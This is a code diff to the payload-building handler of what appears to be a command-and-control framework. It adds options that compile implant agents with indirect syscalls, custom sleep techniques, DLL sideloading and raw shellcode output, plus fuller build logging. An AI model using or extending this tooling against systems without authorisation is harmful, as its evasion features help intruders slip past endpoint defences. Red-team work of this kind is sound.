@@ -202,16 +202,18 @@ func (h *PayloadHandler) GeneratePayload(config PayloadConfig) (PayloadResult, e
 		log.Printf("[ERROR] Failed to get listener %s: %v", config.ListenerID, err)
 		return PayloadResult{}, fmt.Errorf("failed to get listener: %w", err)
 	}
-	log.Printf("[INFO] Using listener: %+v", listener)
+	log.Printf("[INFO] Using listener: %s (%s) at %s:%d", listener.Name, listener.Protocol, listener.Host, listener.Port)
 
 	// Generate unique ID for this payload
 	payloadID := uuid.New().String()
+	log.Printf("[INFO] Generated payload ID: %s", payloadID)
 
 	// Determine build type (debug or release)
 	buildType := "release"
 	if config.AgentType == "debugAgent" {
 		buildType = "debug"
 	}
+	log.Printf("[INFO] Build type: %s", buildType)
 
 	// Create a directory for build artifacts
 	outputDir := filepath.Join(h.payloadsDir, buildType, payloadID)
@@ -227,6 +229,25 @@ func (h *PayloadHandler) GeneratePayload(config PayloadConfig) (PayloadResult, e
 		"server_url":     fmt.Sprintf("%s:%d", listener.Host, listener.Port),
 		"sleep_interval": config.Sleep,
 		"jitter":         2, // Default jitter value
+	}
+
+	// Add additional configuration options based on payload settings
+	if config.IndirectSyscall {
+		log.Printf("[INFO] Enabling indirect syscalls")
+		agentConfig["indirect_syscalls"] = true
+	}
+
+	if config.SleepTechnique != "" && config.SleepTechnique != "standard" {
+		log.Printf("[INFO] Using custom sleep technique: %s", config.SleepTechnique)
+		agentConfig["sleep_technique"] = config.SleepTechnique
+	}
+
+	if config.DllSideloading {
+		log.Printf("[INFO] Enabling DLL sideloading with DLL: %s, Export: %s",
+			config.SideloadDll, config.ExportName)
+		agentConfig["dll_sideloading"] = true
+		agentConfig["sideload_dll"] = config.SideloadDll
+		agentConfig["export_name"] = config.ExportName
 	}
 
 	configJSON, err := json.MarshalIndent(agentConfig, "", "  ")
@@ -265,8 +286,27 @@ func (h *PayloadHandler) GeneratePayload(config PayloadConfig) (PayloadResult, e
 
 	// Set up the command
 	cmdArgs := []string{buildScript, "--target", buildTarget, "--output", outputDir, "--build-type", buildType, "--format", config.Format}
-	log.Printf("[INFO] Command: /bin/bash %s", strings.Join(cmdArgs, " "))
 
+	// Add additional build arguments based on configuration
+	if config.IndirectSyscall {
+		cmdArgs = append(cmdArgs, "--indirect-syscalls")
+	}
+
+	if config.SleepTechnique != "" && config.SleepTechnique != "standard" {
+		cmdArgs = append(cmdArgs, "--sleep-technique", config.SleepTechnique)
+	}
+
+	if config.DllSideloading {
+		cmdArgs = append(cmdArgs, "--dll-sideload")
+		if config.SideloadDll != "" {
+			cmdArgs = append(cmdArgs, "--sideload-dll", config.SideloadDll)
+		}
+		if config.ExportName != "" {
+			cmdArgs = append(cmdArgs, "--export-name", config.ExportName)
+		}
+	}
+
+	log.Printf("[INFO] Command: /bin/bash %s", strings.Join(cmdArgs, " "))
 	cmd := exec.Command("/bin/bash", cmdArgs...)
 
 	// Set working directory to agent source directory
@@ -285,14 +325,30 @@ func (h *PayloadHandler) GeneratePayload(config PayloadConfig) (PayloadResult, e
 	log.Printf("[INFO] Environment variables set: TARGET=%s, OUTPUT_DIR=%s, BUILD_TYPE=%s, LISTENER_HOST=%s, LISTENER_PORT=%d, SLEEP_INTERVAL=%d",
 		buildTarget, outputDir, buildType, listener.Host, listener.Port, config.Sleep)
 
+	log.Printf("[INFO] Starting build process...")
 	// Execute build command
 	output, err := cmd.CombinedOutput()
 	if err != nil {
 		log.Printf("[ERROR] Build command failed: %v\nOutput: %s", err, output)
+
+		// Log each line of the output separately for better visibility in logs
+		outputLines := strings.Split(string(output), "\n")
+		for _, line := range outputLines {
+			if line != "" {
+				log.Printf("[ERROR] Build output: %s", line)
+			}
+		}
+
 		return PayloadResult{}, fmt.Errorf("build failed: %v - %s", err, output)
 	}
 
-	log.Printf("[INFO] Build output: %s", output)
+	// Log each line of the output separately for better visibility in logs
+	outputLines := strings.Split(string(output), "\n")
+	for _, line := range outputLines {
+		if line != "" {
+			log.Printf("[INFO] Build output: %s", line)
+		}
+	}
 
 	// Determine payload filename
 	var payloadFileName string
@@ -303,6 +359,8 @@ func (h *PayloadHandler) GeneratePayload(config PayloadConfig) (PayloadResult, e
 		payloadFileName = "agent.dll"
 	case config.Format == "windows_service":
 		payloadFileName = "agent_service.exe"
+	case config.Format == "windows_shellcode":
+		payloadFileName = "shellcode.bin"
 	default:
 		payloadFileName = "agent"
 	}
@@ -338,7 +396,9 @@ func (h *PayloadHandler) GeneratePayload(config PayloadConfig) (PayloadResult, e
 		Created:  time.Now().Format(time.RFC3339),
 	}
 
-	log.Printf("[INFO] Successfully generated payload: %+v", result)
+	log.Printf("[INFO] Successfully generated payload: %s (%s, %d bytes)",
+		result.Filename, buildType, result.Size)
+
 	return result, nil
 }
 
